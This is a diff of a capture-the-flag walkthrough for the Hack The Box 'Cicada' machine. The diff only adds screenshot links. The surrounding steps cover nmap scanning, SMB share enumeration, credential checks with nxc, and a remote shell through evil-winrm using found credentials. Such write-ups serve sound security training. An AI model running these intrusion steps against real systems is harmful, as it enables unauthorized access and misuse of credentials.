@@ -20,11 +20,30 @@ ls
 sudo openvpn <path_to_vpn_file>
 ```
 
+![image](https://github.com/user-attachments/assets/aef25dc9-ed8f-4d1d-aad2-d6ec0dd95c28)
+
+
+
+![image](https://github.com/user-attachments/assets/20d74be9-6273-4c5b-8da1-6e8196bd212c)
+
+
+
+![image](https://github.com/user-attachments/assets/c5fc1511-7f98-4bc2-a523-ac7ba34d104d)
+
+
+
+
 ### 2. Initial Enumeration
 Scan the target machine using **nmap**:
 ```sh
 nmap -sV -sC -T4 -oN Cicada.txt <ip.address>
 ```
+
+
+![image](https://github.com/user-attachments/assets/5f0ca176-e151-454c-8207-b92efd203319)
+
+
+
 #### Flags Explanation:
 - `-sV` : Service/version detection
 - `-sC` : Default script scanning
@@ -40,6 +59,11 @@ Verify the entry:
 cat /etc/hosts
 ```
 
+
+![image](https://github.com/user-attachments/assets/17892968-1054-4196-8af8-34d2545100ec)
+
+
+
 ### 4. SMB Enumeration
 List available shares:
 ```sh
@@ -49,6 +73,10 @@ If `smbclient` is not installed:
 ```sh
 sudo apt install smbclient
 ```
+
+![image](https://github.com/user-attachments/assets/20fcb8eb-9522-4f4c-aa16-b63c4b26c552)
+
+
 
 Access the **HR** share:
 ```sh
@@ -79,6 +107,13 @@ Confirm valid user:
 nxc smb cicada.htb -u 'cicada.htb\michael.wrightson' -p '<password>' --users
 ```
 
+
+
+![image](https://github.com/user-attachments/assets/a1c458e1-d64c-44a9-85ab-8f37ba4fe82e)
+
+
+
+
 ### 6. Further SMB Access
 Login with the new credentials:
 ```sh
@@ -90,6 +125,13 @@ get Backup_script.ps1
 cat Backup_script.ps1
 ```
 
+
+
+![image](https://github.com/user-attachments/assets/a7fec2da-4200-4767-b265-8e0aeb7fc4ef)
+
+
+
+
 ### 7. Remote Access via Evil-WinRM
 ```sh
 evil-winrm -i cicada.htb -u '<username>' -p '<password>'
@@ -100,12 +142,25 @@ whoami
 ls
 ```
 
+
+
+
+![image](https://github.com/user-attachments/assets/adde7b07-de4e-4713-a3ed-d9b47a903938)
+
+
+
 ### 8. Extracting Sensitive Files
 Move directories:
 ```sh
 cd ..
 cd Desktop
 ```
+
+
+![image](https://github.com/user-attachments/assets/73afa306-68c1-483b-9d9c-3dd873393a8b)
+
+
+
 Read **user.txt**:
 ```sh
 type .\user.txt
